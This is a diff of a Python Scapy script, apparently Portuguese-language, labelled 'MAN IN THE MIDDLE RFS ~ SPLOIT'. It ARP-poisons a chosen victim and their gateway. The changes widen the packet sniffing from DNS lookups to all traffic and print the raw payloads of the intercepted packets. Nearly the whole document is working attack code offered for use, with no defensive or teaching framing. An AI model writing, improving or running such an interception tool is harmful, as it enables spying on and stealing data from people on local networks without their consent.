@@ -1,12 +1,34 @@
+
 from scapy.all import *
-import threading,os,sys 
-print (" MIT RFS ") 
-VIP = raw_input("Ip da vitima: ") 
-GW = raw_input("IP do gateway: ")
-IFACE = raw_input("Nome da interface[ex et0]:")
+import threading,sys
+print('##################################################################\n')
+print ("\n\n MAN IN THE MIDDLE RFS ~ SPLOIT \n\n") 
+print('##################################################################\n')
+VIP = raw_input("[***]Ip: ") 
+GW = raw_input("[***] IP do Gateway: ")
+IFACE = raw_input("Nome da interface[ex eth0/ wlan0]:")
+print('__________________________________________________________________\n')
+
 def dnshandle(pkt):
+ try:
+     #print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
+     host = 'Indefined'
      if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
-          print(VIP+" pesquisou por: "+pkt.getlayer(DNS).qd.qname) 
+          host = pkt.getlayer(DNS).qd.qname
+          print("[*]"+VIP+" Host: "+host)
+          send(pkt)
+
+     if pkt.haslayer(Raw):
+	  print('[**********]RAW HOST[%s]: \n'%host)
+	  val =  str(pkt).encode('HEX')
+	  decoded = str(val).decode('HEX')
+	  print('[**********][+]Data Raw: \n %s \n'%decoded)
+          print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')  
+ except:
+   print('[-]Error:/n %s'%sys.exc_info()[0])
+         
+
+           
 def v_poison():
      v = ARP(pdst=VIP,psrc = GW)
      while True:
@@ -32,4 +54,6 @@ while True:
       gwpoison.setDaemon(True)
       gwthread.append(gwpoison)
       gwpoison.start()
-      pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)
+      pkt = sniff(iface=IFACE,filter='',prn=dnshandle)
+    
+      
